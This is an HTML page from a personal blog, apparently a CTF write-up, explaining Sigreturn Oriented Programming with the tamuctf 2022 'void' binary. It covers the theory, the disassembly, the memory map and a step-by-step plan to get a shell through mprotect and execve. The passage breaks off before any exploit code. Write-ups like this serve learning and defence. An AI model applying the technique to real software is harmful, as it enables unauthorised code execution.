@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.aynakeya.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="BackgroundIn recently ctf (tamuctf 2022), I solve a challenge called void (writeup).  This challenge only contains a few line of assembly code, with no libc and NX enabled. The only thing we can utili">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn - Sigreturn Oriented Programming (SROP) Technique">
+<meta property="og:url" content="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="BackgroundIn recently ctf (tamuctf 2022), I solve a challenge called void (writeup).  This challenge only contains a few line of assembly code, with no libc and NX enabled. The only thing we can utili">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/signal-handling-context.png">
+<meta property="og:image" content="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/2022-04-17_224058.png">
+<meta property="og:image" content="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/signal_frame.png">
+<meta property="article:published_time" content="2022-04-18T04:11:37.000Z">
+<meta property="article:modified_time" content="2022-04-18T07:13:59.457Z">
+<meta property="article:author" content="Aynakeya">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/signal-handling-context.png">
+
+<link rel="canonical" href="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Pwn - Sigreturn Oriented Programming (SROP) Technique | Aynakeya's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Aynakeya's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Take It Easy</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/blog" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-js-projects">
+
+    <a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>js-projects</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf-writeup">
+
+    <a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>ctf-writeup</a>
+
+  </li>
+        <li class="menu-item menu-item-intro">
+
+    <a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Intro</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.aynakeya.com/2022/04/17/ctf/pwn-srop-power-of-sigreturn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/static/intro/images/avatar.jpg">
+      <meta itemprop="name" content="Aynakeya">
+      <meta itemprop="description" content="my blog~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aynakeya's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwn - Sigreturn Oriented Programming (SROP) Technique
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-17 21:11:37" itemprop="dateCreated datePublished" datetime="2022-04-17T21:11:37-07:00">2022-04-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-18 00:13:59" itemprop="dateModified" datetime="2022-04-18T00:13:59-07:00">2022-04-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>In recently ctf (tamuctf 2022), I solve a challenge called <strong>void</strong> (<a href="/ctf-writeup/2022/tamuctf/pwn/void/">writeup</a>). </p>
+<p>This challenge only contains a few line of assembly code, with no libc and NX enabled.</p>
+<p>The only thing we can utilize is a buffer overflow and some syscall gadget. </p>
+<p>It seems impossible to do. However, there is a technique call <strong>SROP - Sigreturn Oriented Programming</strong> that can help us to pwn this binary.</p>
+<h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><p>The original paper is here <a target="_blank" rel="noopener" href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf">paper</a>, <a target="_blank" rel="noopener" href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
+<p>Check it out if you want to.</p>
+<p>I’ll brief explain how SROP works.</p>
+<span id="more"></span>
+
+<h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscall table</a></p>
+<h2 id="Introduce-to-syscall-rt-sigreturn"><a href="#Introduce-to-syscall-rt-sigreturn" class="headerlink" title="Introduce to syscall - rt_sigreturn"></a>Introduce to syscall - rt_sigreturn</h2><p>Here is a picture showing how linux kernel handle signaling.</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/2022/04/17/ctf/pwn-srop-power-of-sigreturn/signal-handling-context.png" alt="signal-handling-context.png"></p>
+<p>rt_sigreturn is a syscall the will be called when program come back from signal handler. </p>
+<p>Since signal handler may change registers, before the program going to signal handler, the program will save current (which is called <strong>Signal Frame</strong>) state including all the register on the stack.</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/2022/04/17/ctf/pwn-srop-power-of-sigreturn/2022-04-17_224058.png" alt="2022-04-17_224058.png"></p>
+<p>Then, after the program come back from signal handler, progrma will use syscall <strong>rt_sigreturn</strong> to recover register and continue running.</p>
+<p>That said, if we can fake <strong>Signal Frame</strong> on the stack, then call <strong>rt_sigreturn</strong>.  we can set register to what ever value we want.</p>
+<p>And here is what <strong>signal frame</strong> looks like in linux x86-64. (detail <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h">here</a>)</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/2022/04/17/ctf/pwn-srop-power-of-sigreturn/signal_frame.png" alt="signal_frame.png"></p>
+<h2 id="How-to-trigger-sigreturn-in-the-first-place"><a href="#How-to-trigger-sigreturn-in-the-first-place" class="headerlink" title="How to trigger sigreturn in the first place."></a>How to trigger sigreturn in the first place.</h2><p>In order to trigger sigreturn and do a srop, the binary should satisfy following criteria</p>
+<ol>
+<li>Knowing the address of <code>syscall; ret</code></li>
+<li>A big enough buffer overflow or something that allow us to write signal frame on the stack</li>
+<li>some how control the value rax</li>
+</ol>
+<p>first and second criteria are easy to spot or identify. For setting the value in rax, there are multiple way to do that.</p>
+<ol>
+<li>using <code>pop rax; ret</code></li>
+<li>using function a function return value (rax is used for function return)</li>
+<li>using syscall read (syscall read will return how many bytes read)</li>
+</ol>
+<h2 id="Getting-a-shell-using-SROP"><a href="#Getting-a-shell-using-SROP" class="headerlink" title="Getting a shell using SROP"></a>Getting a shell using SROP</h2><p>To get a shell, we need to execute <code>execve(&#39;/bin/sh&#39;,0,0)</code> by calling <code>syscall</code></p>
+<p>So, despite all the requirements describe above. We also need an address for <code>/bin/sh</code>.</p>
+<p>If we have a buffer overflow or something, we either write <code>/bin/sh</code> into stack, or we can contruct a rop chain that write <code>/bin/sh</code> some where in the memory.</p>
+<p>Pretty Straightforward</p>
+<h1 id="Example-Void"><a href="#Example-Void" class="headerlink" title="Example - Void"></a>Example - Void</h1><p>Take the example from tamuctf 2022, my writeup <a href="/ctf-writeup/2022/tamuctf/pwn/void/">here</a>.</p>
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>Examining the code, the program only contains following codes. Basicly, the program call <code>main</code> and read 2000 bytes to the stack, then exit.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌ 27: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401000      48c7c0000000.  mov rax, 0                  ; [02] -r-x section size 56 named .text</span><br><span class="line">│           0x00401007      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x0040100e      4889e6         mov rsi, rsp</span><br><span class="line">│           0x00401011      48c7c2d00700.  mov rdx, 0x7d0              ; 2000</span><br><span class="line">│           0x00401018      0f05           syscall</span><br><span class="line">└           0x0040101a      c3             ret</span><br><span class="line">            0x0040101b      0f1f440000     nop dword [rax + rax]</span><br><span class="line">┌ 24: entry0 (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401020      31c0           xor eax, eax</span><br><span class="line">│           0x00401022      e8d9ffffff     call main                   ; int main(int argc, char **argv, char **envp)</span><br><span class="line">│           0x00401027      48c7c03c0000.  mov rax, 0x3c               ; &#x27;&lt;&#x27; ; 60</span><br><span class="line">│           0x0040102e      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x00401035      0f05           syscall</span><br><span class="line">└           0x00401037      c3             ret</span><br></pre></td></tr></table></figure>
+
+<p>And there is no writable memory page except the stack.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- void void ; segment.ehdr</span><br><span class="line">0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x void void ; map.void.r_x</span><br><span class="line">0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- void void ; map.void.r__</span><br><span class="line">0x00007ffe3e60d000 - 0x00007ffe3e62e000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br><span class="line">0x00007ffe3e64f000 - 0x00007ffe3e653000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0x00007ffe3e653000 - 0x00007ffe3e654000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br></pre></td></tr></table></figure>
+
+<p>So, how to use <strong>SROP</strong> to get a shell? Lets think reversely.</p>
+<p>In the end, we want to get a shell, so we must use <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code>. But ‘/bin/sh’ is not in the memory. So, we need to write ‘/bin/sh’ into the memory.</p>
+<p>We can simply write ‘/bin/sh’ on the stack, <strong>however</strong>, there is no way we are able to know the stack address. (In this case, rdi never gonna be 1, so we can’t use <code>write(1,addr,0x7df)</code> to get stack address)</p>
+<p>Here is another method, first, we do a <code>mprotect</code> to make a memory page writable using sigreturn. After sigreturn, rsp (stack pointer) will set to the address now is writable. </p>
+<p>Then we return to <code>main</code> function and write ‘/bin/sh’ and signal frame for calling <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code> there. In that case, we know the address of ‘/bin/sh’.</p>
+<p>Now, how to trigger sigreturn? thats pretty straightforward, Since we have a write syscall in main, we just write 15 bytes to the stack and return to syscall gadget. That will set rax to 15 and trigger sigreturn.</p>
+<p>There one more thing. Since we are using the gadget <code>syscall; ret</code>. After we execute <code>mprotect</code>, the program will ret to a address in the rsp. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 